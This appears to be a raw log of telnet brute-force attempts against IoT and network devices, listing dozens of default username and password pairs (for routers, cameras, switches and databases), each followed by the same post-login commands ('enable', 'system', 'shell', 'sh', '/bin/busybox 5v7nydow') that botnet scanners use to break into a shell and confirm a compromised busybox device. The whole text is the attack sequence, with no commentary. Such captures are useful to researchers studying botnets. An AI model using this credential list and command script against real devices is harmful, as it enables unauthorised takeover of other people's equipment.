root

rain
enable
system
shell
sh
/bin/busybox 5v7nydow
date
enable
system
shell
sh
/bin/busybox 5v7nydow
manager

friend
enable
system
shell
sh
/bin/busybox 5v7nydow
manager
enable
system
shell
sh
/bin/busybox 5v7nydow
admin

password
enable
system
shell
sh
/bin/busybox 5v7nydow
cisco

cisco
enable
system
shell
sh
/bin/busybox 5v7nydow
root

123qwe
enable
system
shell
sh
/bin/busybox 5v7nydow
r00t
enable
system
shell
sh
/bin/busybox 5v7nydow
admin

centuryl1nk
enable
system
shell
sh
/bin/busybox 5v7nydow
root

m
enable
system
shell
sh
/bin/busybox 5v7nydow
root

video
enable
system
shell
sh
/bin/busybox 5v7nydow
admin
enable
system
shell
sh
/bin/busybox 5v7nydow
root

admin
enable
system
shell
sh
/bin/busybox 5v7nydow
root

zlxx.
enable
system
shell
sh
/bin/busybox 5v7nydow
admin

infoblox
enable
system
shell
sh
/bin/busybox 5v7nydow
root

qwe123
enable
system
shell
sh
/bin/busybox 5v7nydow
informix

informix
enable
system
shell
sh
/bin/busybox 5v7nydow
alphanetworks

wrgg15_di524
enable
system
shell
sh
/bin/busybox 5v7nydow
admin

4321
enable
system
shell
sh
/bin/busybox 5v7nydow
admin

switch
enable
system
shell
sh
/bin/busybox 5v7nydow
mpi
enable
system
shell
sh
/bin/busybox 5v7nydow
root

changemenow
enable
system
shell
sh
/bin/busybox 5v7nydow
root

antslq
enable
system
shell
sh
/bin/busybox 5v7nydow
root

权限
enable
system
shell
sh
/bin/busybox 5v7nydow
root

nagiosxi
enable
system
shell
sh
/bin/busybox 5v7nydow
root

zte521
enable
system
shell
sh
/bin/busybox 5v7nydow
888888

888888
enable
system
shell
sh
/bin/busybox 5v7nydow
ascend
enable
system
shell
sh
/bin/busybox 5v7nydow
sync
enable
system
shell
sh
/bin/busybox 5v7nydow
support

support
enable
system
shell
sh
/bin/busybox 5v7nydow
root

tl789
enable
system
shell
sh
/bin/busybox 5v7nydow
admin
enable
system
shell
sh
/bin/busybox 5v7nydow
db2inst1

db2inst1
enable
system
shell
sh
/bin/busybox 5v7nydow
root

centreon
enable
system
shell
sh
/bin/busybox 5v7nydow
secret
enable
system
shell
sh
/bin/busybox 5v7nydow
666666

666666
enable
system
shell
sh
/bin/busybox 5v7nydow
qmik
enable
system
shell
sh
/bin/busybox 5v7nydow
root

54321
enable
system
shell
sh
/bin/busybox 5v7nydow
stoogr
enable
system
shell
sh
/bin/busybox 5v7nydow
netics
enable
system
shell
sh
/bin/busybox 5v7nydow
root
enable
system
shell
sh
/bin/busybox 5v7nydow
root

ikwb
enable
system
shell
sh
/bin/busybox 5v7nydow
oracle

oracle
enable
system
shell
sh
/bin/busybox 5v7nydow
intrastack

asante
enable
system
shell
sh
/bin/busybox 5v7nydow
glftpd

glftpd
enable
system
shell
sh
/bin/busybox 5v7nydow
root

qwerty
enable
system
shell
sh
/bin/busybox 5v7nydow
outofbox
enable
system
shell
sh
/bin/busybox 5v7nydow
root

pass
enable
system
shell
sh
/bin/busybox 5v7nydow
1234
enable
system
shell
sh
/bin/busybox 5v7nydow
admin

1234
enable
system
shell
sh
/bin/busybox 5v7nydow
admin

abc123
enable
system
shell
sh
/bin/busybox 5v7nydow
root

666666
enable
system
shell
sh
/bin/busybox 5v7nydow
root

permit
enable
system
shell
sh
/bin/busybox 5v7nydow
admin

comcomcom
enable
system
shell
sh
/bin/busybox 5v7nydow
root

d13hh[
enable
system
shell
sh
/bin/busybox 5v7nydow
admin
1111
enable
system
shell
sh
/bin/busybox 5v7nydow
draytek

1234
enable
system
shell
sh
/bin/busybox 5v7nydow
ubnt

ubnt
enable
system
shell
sh
/bin/busybox 5v7nydow
db2inst1

ibmdb2
enable
system
shell
sh
/bin/busybox 5v7nydow
root

artica
enable
system
shell
sh
/bin/busybox 5v7nydow
root

blender
enable
system
shell
sh
/bin/busybox 5v7nydow
root

anko
enable
system
shell
sh
/bin/busybox 5v7nydow
root

d13hh[
enable
system
shell
sh
/bin/busybox 5v7nydow
adminttd

adminttd
enable
system
shell
sh
/bin/busybox 5v7nydow
user

forgot
enable
system
shell
sh
/bin/busybox 5v7nydow
lp
enable
system
shell
sh
/bin/busybox 5v7nydow
root

7ujmko0vizxv
enable
system
shell
sh
/bin/busybox 5v7nydow
administrator

admin
enable
system
shell
sh
/bin/busybox 5v7nydow
password
enable
system
shell
sh
/bin/busybox 5v7nydow
cellit

cellit
enable
system
shell
sh
/bin/busybox 5v7nydow
hpsupport

badg3r5s
enable
system
shell
sh
/bin/busybox 5v7nydow
guest

guest
enable
system
shell
sh
/bin/busybox 5v7nydow
root

dottie
enable
system
shell
sh
/bin/busybox 5v7nydow
atc123
enable
system
shell
sh
/bin/busybox 5v7nydow
root

fivranne
enable
system
shell
sh
/bin/busybox 5v7nydow
admin

cisco
enable
system
shell
sh
/bin/busybox 5v7nydow
super

debug
enable
system
shell
sh
/bin/busybox 5v7nydow
friday
enable
system
shell
sh
/bin/busybox 5v7nydow
adtran
enable
system
shell
sh
/bin/busybox 5v7nydow
admin

changeme
enable
system
shell
sh
/bin/busybox 5v7nydow
admin

12345
enable
system
shell
sh
/bin/busybox 5v7nydow
root

f00b@r
enable
system
shell
sh
/bin/busybox 5v7nydow
debug

synnet
enable
system
shell
sh
/bin/busybox 5v7nydow
admin

smcadmin
enable
system
shell
sh
/bin/busybox 5v7nydow
diag

switch
enable
system
shell
sh
/bin/busybox 5v7nydow
admin

123456
enable
system
shell
sh
/bin/busybox 5v7nydow
